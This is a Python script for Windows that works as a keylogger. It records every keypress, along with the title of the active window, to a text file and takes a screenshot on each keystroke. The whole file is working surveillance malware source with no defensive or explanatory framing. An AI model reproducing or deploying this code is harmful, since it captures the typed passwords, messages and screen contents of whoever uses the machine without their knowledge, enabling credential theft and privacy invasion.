from pynput.keyboard import Key, KeyCode, Listener
from win32gui import GetWindowText, GetForegroundWindow
import os, readline, pyautogui, time

#try:
#except typeErr:
#  Need to implement try catch

def on_press(key):
    mon_fichier = open("fichier.txt", "r")
    lineList = mon_fichier.readlines()
    mon_fichier.close()
    mon_fichier = open("fichier.txt", "a")
    if(len(lineList) > 0):
        lastLine = lineList[len(lineList) - 1]
        if(lastLine.find(GetWindowText(GetForegroundWindow())) == -1):
           mon_fichier.write('\n')
           mon_fichier.write(GetWindowText(GetForegroundWindow()))
           mon_fichier.write(' : ')

    nameFile = str(time.time())
    nameFile += '.png'
    pyautogui.screenshot(nameFile)
    print('key :',key)
    if(key == Key.space):
        mon_fichier.write(' ')
    elif(key  ==  Key.tab):
        mon_fichier.write('*TAB*')
    elif(key == Key.backspace):
        mon_fichier.write('*backspace*')
    elif(key == Key.alt_l):
        mon_fichier.write('*alt_left*')
    elif(key == Key.alt_r):
        mon_fichier.write('*alt_right*')
    elif(key == Key.shift):
        mon_fichier.write('*shift_left')
    elif(key == Key.shift_r):
        mon_fichier.write('*shift_right*')
    elif(key == Key.ctrl_l):
        mon_fichier.write('*ctrl_left*')
    elif(key == Key.ctrl_r):
        mon_fichier.write('*ctrl_right*')
    elif(key == Key.delete):
        mon_fichier.write('*DELETE*')
    elif(key == Key.insert):
        mon_fichier.write('*insert*')
    elif(key == Key.home):
        mon_fichier.write('*HOME*')
    elif(key == Key.page_down):
        mon_fichier.write('*page_down*')
    elif(key == Key.page_up):
        mon_fichier.write('*page_up*')
    elif(key == Key.up):
        mon_fichier.write('*arrow_up*')
    elif(key == Key.down):
        mon_fichier.write('*arrow_down*')
    elif(key == Key.left):
        mon_fichier.write('*arrow_left*')
    elif(key == Key.right):
        mon_fichier.write('*arrow_right*')
    elif(key == Key.enter):
        mon_fichier.write('*ENTER*')
    elif(key == Key.caps_lock):
        mon_fichier.write('*caps_lock*')
    elif(key == Key.print_screen):
        mon_fichier.write('*print_screen*')
    elif(key == Key.scroll_lock):
        mon_fichier.write('*scroll_lock*')
    elif(key == Key.pause):
        mon_fichier.write('*pause_key*')
    elif(key == Key.esc):
        mon_fichier.write('*ESCAPE*')
    elif(key == Key.f1):
        mon_fichier.write('*F1*')
    elif(key == Key.f2):
        mon_fichier.write('*F2*')
    elif(key == Key.f3):
        mon_fichier.write('*F3*')
    elif(key == Key.f4):
        mon_fichier.write('*F4*')
    elif(key == Key.f5):
        mon_fichier.write('*F5*')
    elif(key == Key.f6):
        mon_fichier.write('*F6*')
    elif(key == Key.f7):
        mon_fichier.write('*F7*')
    elif(key == Key.f8):
        mon_fichier.write('*F8*')
    elif(key == Key.f9):
        mon_fichier.write('*F9*')
    elif(key == Key.f10):
        mon_fichier.write('*F10*')
    elif(key == Key.f11):
        mon_fichier.write('*F11*')
    elif(key == Key.f12):
        mon_fichier.write('*F12*')
    elif(key == Key.menu):
        mon_fichier.write('*menu_key*')
    elif(key == Key.cmd):
        mon_fichier.write('*cmd_key*')
    elif(key == Key.num_lock):
        mon_fichier.write('*NUm_LOCK*')
    else:
        mon_fichier.write(format(key.char))
    mon_fichier.close()
# Collect events until released
with Listener(on_press=on_press) as listener:
    listener.join()
    
